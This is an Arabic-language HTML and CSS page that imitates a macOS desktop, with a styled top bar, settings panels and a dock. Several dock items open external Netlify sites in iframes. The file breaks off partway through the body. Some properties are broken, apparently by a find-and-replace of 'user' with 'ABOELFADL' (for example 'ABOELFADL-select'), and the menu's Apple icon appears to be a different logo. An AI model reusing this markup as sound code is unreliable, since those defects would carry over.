<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, ABOELFADL-scalable=no">
    <title>macOS Web Simulator</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Patrick+Hand&display=swap" rel="stylesheet">
    <style>
        :root {
            --dock-item-size: 52px;
            --top-bar-height: 28px;
            --accent-color: #3b82f6;
            --sidebar-icon-size: 16px;
            --scrollbar-visibility: auto;
        }
        html, body {
            height: 100%;
            width: 100%;
            overflow: hidden;
        }
        body {
            font-family: 'Inter', 'Cairo', sans-serif;
            background: url('https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/1a42e634-f588-40e9-941b-60cf3f20aa39/dflzkpn-5cf9b61b-0e85-4dfb-868e-0e8bca0ec3f8.jpg/v1/fill/w_1280,h_720,q_75,strp/abstract_macbook_wallpaper_by_wallswiftnet_dflzkpn-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NzIwIiwicGF0aCI6IlwvZlwvMWE0MmU2MzQtZjU4OC00MGU5LTk0MWItNjBjZjNmMjBhYTM5XC9kZmx6a3BuLTVjZjliNjFiLTBlODUtNGRmYi04NjhlLTBlOGJjYTBlYzNmOC5qcGciLCJ3aWR0aCI6Ijw9MTI4MCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.CkAtwyLDj08LA-y1S6lqMVN_jyo1NgzEQFbaq2Dtslo') no-repeat center center fixed;
            background-size: cover;
            ABOELFADL-select: none;
            cursor: default;
            transition: background-image 0.5s ease-in-out;
        }
        .glass { background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(25px) saturate(150%); -webkit-backdrop-filter: blur(25px) saturate(150%); border: 1px solid rgba(255, 255, 255, 0.1); }
        #top-bar { height: var(--top-bar-height); color: #fff; text-shadow: 0 1px 3px rgba(0,0,0,0.4); }
        
        #dock.magnification-enabled:hover .dock-item:hover { transform: scale(1.35) translateY(-10px); }
        #dock.magnification-enabled:hover .dock-item:hover + .dock-item,
        #dock.magnification-enabled .dock-item.prev-hover { transform: scale(1.15) translateY(-5px); }
        #dock .dock-item { width: var(--dock-item-size); height: var(--dock-item-size); transition: all 0.15s cubic-bezier(0.25, 0.46, 0.45, 0.94); cursor: pointer; }
        .launchpad-icon-container { padding: 4px; }

        .window { 
            min-width: 550px; 
            min-height: 400px; 
            position: absolute; 
            resize: both; 
            overflow: hidden; 
            display: flex; 
            flex-direction: column; 
            border-radius: 12px; 
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5); 
            background: rgba(242, 242, 247, 0.95); 
            backdrop-filter: blur(30px) saturate(180%); 
            -webkit-backdrop-filter: blur(30px) saturate(180%); 
            border: 1px solid rgba(0, 0, 0, 0.1); 
            transition: background-color 0.3s ease;
        }
        .title-bar { 
            height: 38px; 
            display: flex; 
            align-items: center; 
            justify-content: flex-start; 
            padding: 0 12px; 
            cursor: move; 
            flex-shrink: 0; 
            border-bottom: 1px solid rgba(0,0,0,0.06); 
            background: rgba(248, 248, 248, 0.8);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 12px 12px 0 0;
        }
        
        .traffic-lights { 
            display: flex; 
            gap: 6px; 
            margin-right: 8px;
        }
        
        .traffic-light { 
            width: 12px; 
            height: 12px; 
            border-radius: 50%; 
            border: 1px solid rgba(0,0,0,0.1); 
            cursor: pointer;
            transition: all 0.2s ease;
            position: relative;
        }
        
        .traffic-light:hover {
            transform: scale(1.1);
        }
        
        .close-btn { 
            background-color: #ff5f57; 
            border-color: #e0443e;
        }
        
        .close-btn:hover {
            background-color: #ff4444;
        }
        
        .min-btn { 
            background-color: #ffbd2e; 
            border-color: #dea123;
        }
        
        .min-btn:hover {
            background-color: #ffb300;
        }
        
        .max-btn { 
            background-color: #28ca42; 
            border-color: #1faa34;
        }
        
        .max-btn:hover {
            background-color: #24c93d;
        }
        
        .window-content { 
            flex-grow: 1; 
            overflow: hidden; 
            color: #1a1a1a; 
            display: flex;
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
        }

        body.dark-mode .window { 
            background: rgba(28, 28, 30, 0.95); 
            border: 1px solid rgba(255, 255, 255, 0.1); 
        }
        
        body.dark-mode .title-bar { 
            border-bottom: 1px solid rgba(255,255,255,0.08); 
            background: rgba(44, 44, 46, 0.8);
        }
        
        body.dark-mode .window-content { 
            color: #f0f0f0; 
            background: rgba(28, 28, 30, 0.8);
        }
        body.dark-mode .settings-sidebar, body.dark-mode .settings-pane-list { background-color: rgba(60, 60, 60, 0.8); }
        body.dark-mode .settings-item:hover, body.dark-mode .settings-list-item:hover { background-color: rgba(255,255,255,0.08); }
        body.dark-mode .settings-item.active { background-color: rgba(50, 130, 255, 0.8); }
        
        body.high-contrast .window { background: rgba(0, 0, 0, 0.9); border: 2px solid #fff; }
        body.high-contrast .title-bar { background: #000; color: #fff; border-bottom: 2px solid #fff; }
        body.high-contrast .settings-sidebar { background-color: rgba(0, 0, 0, 0.9); border-right: 2px solid #fff; }
        body.high-contrast .settings-pane-list { background-color: rgba(0, 0, 0, 0.9); border: 2px solid #fff; }
        body.high-contrast .settings-list-item { border-bottom: 2px solid #fff; color: #fff; }
        body.high-contrast .settings-item { color: #fff; }
        body.high-contrast .settings-item:hover { background-color: rgba(255,255,255,0.2); }
        body.high-contrast .settings-item.active { background-color: #fff; color: #000; }
        
        input[type="range"] {
            -webkit-appearance: none;
            appearance: none;
            background: transparent;
            cursor: pointer;
        }
        
        input[type="range"]::-webkit-slider-track {
            background: #ddd;
            height: 4px;
            border-radius: 2px;
        }
        
        input[type="range"]::-webkit-slider-thumb {
            -webkit-appearance: none;
            appearance: none;
            background: #007aff;
            height: 16px;
            width: 16px;
            border-radius: 50%;
            cursor: pointer;
        }
        
        input[type="range"]::-moz-range-track {
            background: #ddd;
            height: 4px;
            border-radius: 2px;
        }
        
                 input[type="range"]::-moz-range-thumb {
             background: #007aff;
             height: 16px;
             width: 16px;
             border-radius: 50%;
             cursor: pointer;
             border: none;
         }
         
         .theme-option.selected {
             border-color: #007aff;
             background-color: rgba(0, 122, 255, 0.05);
         }
         
         .accent-color-option.selected {
             border-color: #333;
             transform: scale(1.1);
             box-shadow: 0 0 0 2px rgba(0, 122, 255, 0.3);
         }
         
         input[type="radio"], input[type="checkbox"] {
             accent-color: #007aff;
         }
         
         body.dark-mode .theme-option {
             background-color: rgba(255, 255, 255, 0.05);
         }
         
         body.dark-mode .theme-option:hover {
             background-color: rgba(255, 255, 255, 0.1);
         }
         
         body.dark-mode .theme-option.selected {
             background-color: rgba(0, 122, 255, 0.2);
         }
         
         ::-webkit-scrollbar {
             width: 8px;
             height: 8px;
             visibility: var(--scrollbar-visibility);
         }
         
         ::-webkit-scrollbar-track {
             background: rgba(0, 0, 0, 0.1);
             border-radius: 4px;
         }
         
         ::-webkit-scrollbar-thumb {
             background: rgba(0, 0, 0, 0.3);
             border-radius: 4px;
         }
         
         ::-webkit-scrollbar-thumb:hover {
             background: rgba(0, 0, 0, 0.5);
         }
         
         body.dark-mode ::-webkit-scrollbar-track {
             background: rgba(255, 255, 255, 0.1);
         }
         
         body.dark-mode ::-webkit-scrollbar-thumb {
             background: rgba(255, 255, 255, 0.3);
         }
         
         body.dark-mode ::-webkit-scrollbar-thumb:hover {
             background: rgba(255, 255, 255, 0.5);
         }
         
         .appearance-content {
             padding: 0;
             max-width: 100%;
         }
         
         .settings-section {
             margin-bottom: 32px;
             border-bottom: 1px solid rgba(0, 0, 0, 0.1);
             padding-bottom: 24px;
         }
         
         .settings-section:last-child {
             border-bottom: none;
             margin-bottom: 0;
         }
         
         .section-header {
             margin-bottom: 16px;
         }
         
         .section-title {
             font-size: 13px;
             font-weight: 600;
             color: #1d1d1f;
             text-transform: uppercase;
             letter-spacing: 0.5px;
             margin: 0;
         }
         
         .section-content {
             padding-left: 0;
         }
         
         .appearance-options {
             display: flex;
             gap: 16px;
             margin-bottom: 8px;
         }
         
         .appearance-option {
             flex: 1;
             cursor: pointer;
             border-radius: 8px;
             padding: 16px;
             border: 2px solid transparent;
             transition: all 0.2s ease;
             background: rgba(0, 0, 0, 0.02);
         }
         
         .appearance-option:hover {
             background: rgba(0, 0, 0, 0.04);
         }
         
         .appearance-option.selected {
             border-color: #007AFF;
             background: rgba(0, 122, 255, 0.05);
         }
         
         .appearance-preview {
             height: 80px;
             border-radius: 6px;
             margin-bottom: 12px;
             display: flex;
             align-items: center;
             justify-content: center;
             background: #f5f5f7;
         }
         
         .light-preview {
             background: linear-gradient(135deg, #f5f5f7 0%, #e5e5e7 100%);
         }
         
         .dark-preview {
             background: linear-gradient(135deg, #1d1d1f 0%, #2d2d2f 100%);
         }
         
         .auto-preview {
             background: linear-gradient(135deg, #f5f5f7 0%, #1d1d1f 100%);
         }
         
         .preview-window {
             width: 60px;
             height: 40px;
             border-radius: 4px;
             background: #ffffff;
             border: 1px solid rgba(0, 0, 0, 0.1);
             overflow: hidden;
         }
         
         .preview-window.dark {
             background: #2d2d2f;
             border-color: rgba(255, 255, 255, 0.1);
         }
         
         .preview-window.auto {
             background: linear-gradient(to right, #ffffff 50%, #2d2d2f 50%);
             border-color: rgba(0, 0, 0, 0.1);
         }
         
         .preview-titlebar {
             height: 8px;
             background: #e5e5e7;
             border-bottom: 1px solid rgba(0, 0, 0, 0.1);
         }
         
         .preview-titlebar.dark {
             background: #1d1d1f;
             border-bottom-color: rgba(255, 255, 255, 0.1);
         }
         
         .preview-titlebar.auto {
             background: linear-gradient(to right, #e5e5e7 50%, #1d1d1f 50%);
         }
         
         .preview-content {
             height: 31px;
             background: #ffffff;
         }
         
         .preview-content.dark {
             background: #2d2d2f;
         }
         
         .preview-content.auto {
             background: linear-gradient(to right, #ffffff 50%, #2d2d2f 50%);
         }
         
         .appearance-label {
             display: flex;
             align-items: center;
             gap: 8px;
             justify-content: center;
         }
         
         .radio-button {
             width: 16px;
             height: 16px;
             border: 2px solid #8e8e93;
             border-radius: 50%;
             position: relative;
             transition: all 0.2s ease;
         }
         
         .radio-button.selected {
             border-color: #007AFF;
         }
         
         .radio-button.selected::after {
             content: '';
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             width: 6px;
             height: 6px;
             background: #007AFF;
             border-radius: 50%;
         }
         
         .appearance-label span {
             font-size: 13px;
             font-weight: 500;
             color: #1d1d1f;
         }
         
         .accent-colors {
             display: grid;
             grid-template-columns: repeat(6, 1fr);
             gap: 12px;
             margin-bottom: 8px;
         }
         
         .accent-color {
             width: 32px;
             height: 32px;
             border-radius: 50%;
             cursor: pointer;
             border: 2px solid transparent;
             transition: all 0.2s ease;
             position: relative;
         }
         
         .accent-color:hover {
             transform: scale(1.1);
         }
         
         .accent-color.selected {
             border-color: #1d1d1f;
             transform: scale(1.1);
         }
         
         .accent-color.selected::after {
             content: '✓';
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             color: white;
             font-size: 14px;
             font-weight: bold;
             text-shadow: 0 1px 2px rgba(0, 0, 0, 0.5);
         }
         
         .slider-container {
             margin-bottom: 8px;
         }
         
         .slider-labels {
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 8px;
         }
         
         .slider-label {
             font-size: 11px;
             color: #86868b;
             font-weight: 500;
         }
         
         .slider-value {
             font-size: 13px;
             color: #007AFF;
             font-weight: 600;
         }
         
         .slider-track {
             position: relative;
             height: 4px;
         }
         
         .mac-slider {
             width: 100%;
             height: 4px;
             background: #e5e5e7;
             border-radius: 2px;
             outline: none;
             -webkit-appearance: none;
             appearance: none;
             cursor: pointer;
             position: relative;
         }
         
         .mac-slider::-webkit-slider-track {
             width: 100%;
             height: 4px;
             background: #e5e5e7;
             border-radius: 2px;
             border: none;
         }
         
         .mac-slider::-webkit-slider-thumb {
             -webkit-appearance: none;
             appearance: none;
             width: 20px;
             height: 20px;
             background: #ffffff;
             border-radius: 50%;
             cursor: pointer;
             border: 1px solid #d1d1d6;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15), 0 0 0 1px rgba(0, 0, 0, 0.05);
             transition: all 0.2s ease;
             position: relative;
         }
         
         .mac-slider::-webkit-slider-thumb:hover {
             transform: scale(1.1);
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2), 0 0 0 1px rgba(0, 0, 0, 0.1);
         }
         
         .mac-slider::-webkit-slider-thumb:active {
             transform: scale(1.15);
             box-shadow: 0 6px 16px rgba(0, 0, 0, 0.25), 0 0 0 1px rgba(0, 0, 0, 0.15);
         }
         
         .mac-slider::-moz-range-track {
             width: 100%;
             height: 4px;
             background: #e5e5e7;
             border-radius: 2px;
             border: none;
         }
         
         .mac-slider::-moz-range-thumb {
             width: 20px;
             height: 20px;
             background: #ffffff;
             border-radius: 50%;
             cursor: pointer;
             border: 1px solid #d1d1d6;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15), 0 0 0 1px rgba(0, 0, 0, 0.05);
             transition: all 0.2s ease;
         }
         
         .mac-slider::-moz-range-thumb:hover {
             transform: scale(1.1);
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2), 0 0 0 1px rgba(0, 0, 0, 0.1);
         }
         
         .mac-slider::-moz-range-thumb:active {
             transform: scale(1.15);
             box-shadow: 0 6px 16px rgba(0, 0, 0, 0.25), 0 0 0 1px rgba(0, 0, 0, 0.15);
         }
         
         .mac-slider.ios-style {
             background: linear-gradient(to right, #007AFF 0%, #007AFF 50%, #e5e5e7 50%, #e5e5e7 100%);
         }
         
         .mac-slider.ios-style::-webkit-slider-track {
             background: linear-gradient(to right, #007AFF 0%, #007AFF 50%, #e5e5e7 50%, #e5e5e7 100%);
         }
         
         .mac-slider.ios-style::-moz-range-track {
             background: linear-gradient(to right, #007AFF 0%, #007AFF 50%, #e5e5e7 50%, #e5e5e7 100%);
         }
         
         body.dark-mode .mac-slider {
             background: #424245;
         }
         
         body.dark-mode .mac-slider::-webkit-slider-track {
             background: #424245;
         }
         
         body.dark-mode .mac-slider::-moz-range-track {
             background: #424245;
         }
         
         body.dark-mode .mac-slider::-webkit-slider-thumb {
             background: #f5f5f7;
             border-color: #636366;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.1);
         }
         
         body.dark-mode .mac-slider::-moz-range-thumb {
             background: #f5f5f7;
             border-color: #636366;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.1);
         }
         
         body.dark-mode .mac-slider.ios-style {
             background: linear-gradient(to right, #0A84FF 0%, #0A84FF 50%, #424245 50%, #424245 100%);
         }
         
         body.dark-mode .mac-slider.ios-style::-webkit-slider-track {
             background: linear-gradient(to right, #0A84FF 0%, #0A84FF 50%, #424245 50%, #424245 100%);
         }
         
         body.dark-mode .mac-slider.ios-style::-moz-range-track {
             background: linear-gradient(to right, #0A84FF 0%, #0A84FF 50%, #424245 50%, #424245 100%);
         }
         
         body.dark-mode .mac-slider.ios-style {
             background: linear-gradient(to right, #0A84FF 0%, #0A84FF 50%, #424245 50%, #424245 100%) !important;
         }
         
         body.dark-mode .mac-slider.ios-style::-webkit-slider-track {
             background: linear-gradient(to right, #0A84FF 0%, #0A84FF 50%, #424245 50%, #424245 100%) !important;
         }
         
         body.dark-mode .mac-slider.ios-style::-moz-range-track {
             background: linear-gradient(to right, #0A84FF 0%, #0A84FF 50%, #424245 50%, #424245 100%) !important;
         }
         
         .slider-track {
             position: relative;
             height: 4px;
             background: #e5e5e7;
             border-radius: 2px;
             margin: 8px 0;
         }
         
         body.dark-mode .slider-track {
             background: #424245;
         }
         
         .slider-value {
             font-size: 13px;
             color: #007AFF;
             font-weight: 600;
             min-width: 30px;
             text-align: center;
         }
         
         body.dark-mode .slider-value {
             color: #0A84FF;
         }
         
         .radio-group {
             display: flex;
             flex-direction: column;
             gap: 12px;
             margin-bottom: 8px;
         }
         
         .radio-option {
             display: flex;
             align-items: center;
             gap: 12px;
             cursor: pointer;
             padding: 4px 0;
         }
         
         .mac-radio {
             display: none;
         }
         
         .radio-custom {
             width: 16px;
             height: 16px;
             border: 2px solid #8e8e93;
             border-radius: 50%;
             position: relative;
             transition: all 0.2s ease;
         }
         
         .mac-radio:checked + .radio-custom {
             border-color: #007AFF;
         }
         
         .mac-radio:checked + .radio-custom::after {
             content: '';
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             width: 6px;
             height: 6px;
             background: #007AFF;
             border-radius: 50%;
         }
         
         .radio-label {
             font-size: 13px;
             color: #1d1d1f;
             font-weight: 500;
         }
         
         .select-container {
             margin-bottom: 8px;
         }
         
         .mac-select {
             width: 200px;
             padding: 8px 12px;
             border: 1px solid #d2d2d7;
             border-radius: 6px;
             background: #ffffff;
             font-size: 13px;
             color: #1d1d1f;
             outline: none;
             transition: all 0.2s ease;
         }
         
         .mac-select:focus {
             border-color: #007AFF;
             box-shadow: 0 0 0 3px rgba(0, 122, 255, 0.1);
         }
         
         .checkbox-group {
             display: flex;
             flex-direction: column;
             gap: 12px;
             margin-bottom: 8px;
         }
         
         .checkbox-option {
             display: flex;
             align-items: center;
             gap: 12px;
             cursor: pointer;
             padding: 4px 0;
         }
         
         .mac-checkbox {
             display: none;
         }
         
         .checkbox-custom {
             width: 16px;
             height: 16px;
             border: 2px solid #8e8e93;
             border-radius: 3px;
             position: relative;
             transition: all 0.2s ease;
             background: #ffffff;
         }
         
         .mac-checkbox:checked + .checkbox-custom {
             background: #007AFF;
             border-color: #007AFF;
         }
         
         .mac-checkbox:checked + .checkbox-custom::after {
             content: '✓';
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
             color: white;
             font-size: 12px;
             font-weight: bold;
         }
         
         .checkbox-label {
             font-size: 13px;
             color: #1d1d1f;
             font-weight: 500;
         }
         
         body.dark-mode .section-title {
             color: #f5f5f7;
         }
         
         body.dark-mode .appearance-option {
             background: rgba(255, 255, 255, 0.05);
         }
         
         body.dark-mode .appearance-option:hover {
             background: rgba(255, 255, 255, 0.08);
         }
         
         body.dark-mode .appearance-option.selected {
             background: rgba(0, 122, 255, 0.15);
         }
         
         body.dark-mode .appearance-label span {
             color: #f5f5f7;
         }
         
         body.dark-mode .slider-label {
             color: #86868b;
         }
         
         body.dark-mode .radio-label,
         body.dark-mode .checkbox-label {
             color: #f5f5f7;
         }
         
         body.dark-mode .mac-select {
             background: #2d2d2f;
             border-color: #424245;
             color: #f5f5f7;
         }
         
         body.dark-mode .checkbox-custom {
             background: #2d2d2f;
             border-color: #424245;
         }
        
        .settings-sidebar { 
            width: 220px; 
            flex-shrink: 0; 
            background-color: rgba(248, 248, 248, 0.95); 
            padding: 16px 0; 
            overflow-y: auto; 
            transition: background-color 0.3s ease;
            border-right: 1px solid rgba(0, 0, 0, 0.06);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
        }
        
        .settings-item { 
            display: flex; 
            align-items: center; 
            gap: 12px; 
            padding: 10px 16px; 
            margin: 0 8px 2px 8px;
            border-radius: 8px; 
            cursor: pointer; 
            font-size: 13px; 
            font-weight: 500; 
            transition: all 0.2s ease;
            color: #1d1d1f;
        }
        
        .settings-item:hover { 
            background-color: rgba(0, 0, 0, 0.04); 
        }
        
        .settings-item.active { 
            background-color: #007AFF; 
            color: white; 
            box-shadow: 0 2px 8px rgba(0, 122, 255, 0.3);
        }
        
        .settings-item.active svg { 
            filter: brightness(0) invert(1); 
        }
        
        .settings-content { 
            flex-grow: 1; 
            padding: 24px 32px; 
            overflow-y: auto; 
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
        }
        .settings-pane-list { background-color: rgba(242, 242, 247, 0.9); border-radius: 10px; }
        .settings-list-item { display: flex; justify-content: space-between; align-items: center; padding: 10px 15px; border-bottom: 1px solid rgba(0,0,0,0.07); }
        .settings-list-item:last-child { border-bottom: none; }
        body.dark-mode .settings-list-item { border-bottom: 1px solid rgba(255,255,255,0.1); }
        .wallpaper-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 1rem; }
        .wallpaper-thumb { width: 100%; height: 70px; border-radius: 8px; object-fit: cover; cursor: pointer; border: 2px solid transparent; transition: border-color 0.2s ease; }
        .wallpaper-thumb:hover, .wallpaper-thumb.active { border-color: #007aff; }
        .upload-btn { background-color: #007aff; color: white; padding: 8px 16px; border-radius: 8px; cursor: pointer; text-align: center; }

        #launchpad { position: fixed; inset: 0; background-color: rgba(0,0,0,0.3); backdrop-filter: blur(25px) saturate(150%); z-index: 9990; display: flex; justify-content: center; align-items: center; opacity: 0; visibility: hidden; transition: opacity 0.3s ease, visibility 0.3s ease; }
        #launchpad.visible { opacity: 1; visibility: visible; }
        .launchpad-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(90px, 1fr)); gap: 2rem; width: 80%; max-width: 900px; }
        .launchpad-item { display: flex; flex-direction: column; align-items: center; gap: 0.5rem; color: white; text-shadow: 1px 1px 3px rgba(0,0,0,0.5); cursor: pointer; }
        .launchpad-item img { width: 72px; height: 72px; border-radius: 16px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); transition: transform 0.2s ease; }
        .launchpad-item:hover img { transform: scale(1.1); }

        #apple-menu { position: relative; }
        #apple-menu-dropdown {
            display: none;
            position: absolute;
            top: 100%;
            left: 0;
            background-color: rgba(240, 240, 240, 0.8);
            backdrop-filter: blur(20px);
            border-radius: 6px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.2);
            min-width: 220px;
            z-index: 10000;
            padding: 5px;
            color: black;
            text-align: right;
        }
        .apple-menu-item { padding: 5px 15px; border-radius: 4px; cursor: default; }
        .apple-menu-item:hover { background-color: #007aff; color: white; }
        .apple-menu-separator { height: 1px; background-color: rgba(0,0,0,0.1); margin: 5px 0; }
        
        .notes-textarea {
            font-family: 'Patrick Hand', cursive;
            background-color: #FBF4D9;
            color: #3a290a;
            font-size: 1.2rem;
            line-height: 1.6;
            border: none;
            outline: none;
            resize: none;
            width: 100%;
            height: 100%;
            padding: 25px 30px;
        }

        @keyframes genie-open {
            0% {
                transform-origin: center bottom;
                transform: scaleY(0.05) scaleX(0.2) translateY(80%) skewX(-35deg);
                opacity: 0.1;
                filter: blur(10px);
            }
            30% {
                transform-origin: center bottom;
                transform: scaleY(0.2) scaleX(0.5) translateY(40%) skewX(-20deg);
                opacity: 0.7;
                filter: blur(4px);
            }
            60% {
                transform-origin: center bottom;
                transform: scaleY(1.05) scaleX(1.1) translateY(-8%) skewX(8deg);
                opacity: 1;
                filter: blur(0px);
            }
            80% {
                transform-origin: center bottom;
                transform: scaleY(0.98) scaleX(0.98) translateY(2%) skewX(-3deg);
            }
            100% {
                transform-origin: center bottom;
                transform: scaleY(1) scaleX(1) translateY(0) skewX(0deg);
                opacity: 1;
                filter: blur(0px);
            }
        }
        @keyframes genie-close {
            0% {
                transform-origin: center bottom;
                transform: scaleY(1) scaleX(1) translateY(0) skewX(0deg);
                opacity: 1;
                filter: blur(0px);
            }
            30% {
                transform-origin: center bottom;
                transform: scaleY(1.05) scaleX(1.1) translateY(-8%) skewX(8deg);
                opacity: 1;
                filter: blur(0px);
            }
            60% {
                transform-origin: center bottom;
                transform: scaleY(0.2) scaleX(0.5) translateY(40%) skewX(-20deg);
                opacity: 0.7;
                filter: blur(4px);
            }
            100% {
                transform-origin: center bottom;
                transform: scaleY(0.05) scaleX(0.2) translateY(80%) skewX(-35deg);
                opacity: 0.1;
                filter: blur(10px);
            }
        }
        .genie-animate {
            animation: genie-open 0.55s cubic-bezier(0.42, 0.0, 0.58, 1.0) both;
            will-change: transform, opacity, filter;
            transform-origin: center bottom;
        }
        .genie-close {
            animation: genie-close 0.55s cubic-bezier(0.42, 0.0, 0.58, 1.0) both;
            will-change: transform, opacity, filter;
            transform-origin: center bottom;
        }
    </style>
</head>
<body class="w-screen h-screen">
    <div id="brightness-overlay" class="fixed inset-0 bg-black pointer-events-none z-[9998]" style="opacity: 0;"></div>

    <div id="top-bar" class="fixed top-0 left-0 right-0 px-4 flex justify-between items-center z-50 glass">
         <div class="flex items-center gap-4 text-sm font-semibold">
            <div id="apple-menu">
                <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="currentColor" class="text-white cursor-pointer"><path d="M12.012,2.5c-5.25,0-9.5,4.063-9.5,9.078,0,2.922,1.406,5.547,3.609,7.219c0.641,0.484,1.125,0.313,1.125-0.5c0-0.25,0-1.109,0-2.125c-1.641,0.219-2.297-0.781-2.297-0.781c-0.563-1.422-1.375-1.813-1.375-1.813c-1.125-0.766,0.078-0.75,0.078-0.75c1.25,0.078,1.922,1.266,1.922,1.266c1.109,1.891,2.891,1.344,3.609,1.031c0.109-0.797,0.438-1.344,0.813-1.656c-2.75-0.313-5.641-1.359-5.641-6.031c0-1.344,0.484-2.438,1.281-3.297c-0.125-0.313-0.547-1.547,0.125-3.25c0,0,1.031-0.328,3.375,1.25c1-0.281,2.063-0.422,3.125-0.422s2.125,0.141,3.125,0.422c2.344-1.578,3.375-1.25,3.375-1.25c0.672,1.703,0.25,2.938,0.125,3.25c0.797,0.859,1.281,1.953,1.281,3.297c0,4.688-2.891,5.719-5.656,6.016c0.453,0.391,0.859,1.156,0.859,2.328c0,1.688,0,3.047,0,3.453c0,0.813,0.484,1,1.141,0.5c2.203-1.672,3.609-4.297,3.609-7.219c0-5.016-4.25-9.078-9.512-9.078Z"></path></svg>
                <div id="apple-menu-dropdown">
                    <div class="apple-menu-item">حول هذا الـ Mac</div>
                    <div class="apple-menu-item" onclick="openSettings()">إعدادات النظام...</div>
                    <div class="apple-menu-separator"></div>
                    <div class="apple-menu-item">إسبات</div>
                    <div class="apple-menu-item">إعادة التشغيل...</div>
                    <div class="apple-menu-item">إيقاف التشغيل...</div>
                </div>
            </div>
            <span id="active-app-name" class="font-bold">نظام ويب</span>
        </div>
        <div class="flex items-center gap-4 text-sm font-medium">
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 18.5a6.5 6.5 0 1 0 0-13 6.5 6.5 0 0 0 0 13Z"></path><path d="M18.5 12a6.5 6.5 0 0 0-6.5-6.5v13a6.5 6.5 0 0 0 6.5-6.5Z"></path><path d="M12 4V2M12 22v-2M4 12H2M22 12h-2"></path></svg>
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M15.384 1.216a.615.615 0 0 0-.87-.002L.615 11.134a.615.615 0 0 0 .434 1.052l5.013-.001a.615.615 0 0 0 .434-.18l9.9-9.9a.615.615 0 0 0-.012-.87Zm-10.37 8.54.002-.002.002-.002-5.013.001a.015.015 0 0 1-.01-.026l5.012.002Z"></path><path d="M11.945 3.055a.615.615 0 0 1 .87.002l2.475 2.475a.615.615 0 0 1-.002.87L5.384 15.31a.615.615 0 0 1-1.052-.434l.001-5.013a.615.615 0 0 1 .18-.434z"></path></svg>
            <span>ABOELFADL</span>
            <div id="clock"></div>
        </div>
    </div>

    <div id="desktop" class="w-full h-full"></div>

    <div id="dock" class="fixed bottom-2 left-1/2 -translate-x-1/2 flex items-end h-20 space-x-2 p-2 glass rounded-2xl z-40 magnification-enabled">
        <div class="dock-item launchpad-icon-container" onclick="toggleLaunchpad()"><img src="https://cdn-icons-png.flaticon.com/128/831/831327.png" alt="Launchpad"></div>
        <div class="dock-item" onclick="openApp('Chrome', 'Chrome', `<iframe src='https://www.google.com/webhp?igu=1' class='w-full h-full border-0'></iframe>`)" ><img src="https://cdn-icons-png.flaticon.com/128/831/831364.png" alt="Safari"></div>
        <div class="dock-item" onclick="openApp('AoElfadl Tools', 'AoElfadl Tools', `<iframe src='https://aboelfadl-tools.netlify.app/' class='w-full h-full border-0'></iframe>`)" ><img src="https://aboelfadl-tools.netlify.app/icons/mahmoud.png" alt="Safari"></div>
 <div class="dock-item" onclick="openApp('100-pounds-credit', '100-pounds-credit', `<iframe src='https://100-pounds-credit.netlify.app/' class='w-full h-full border-0'></iframe>`)" ><img src="https://cdn-icons-png.flaticon.com/128/5977/5977576.png" alt="Safari"></div>
<div class="dock-item" onclick="openApp('IP & Camera', 'IP & Camera', `<iframe src='https://c-ip.netlify.app/' class='w-full h-full border-0'></iframe>`)" ><img src="https://cdn-icons-png.flaticon.com/128/831/831318.png" alt="IP & Camera"></div>
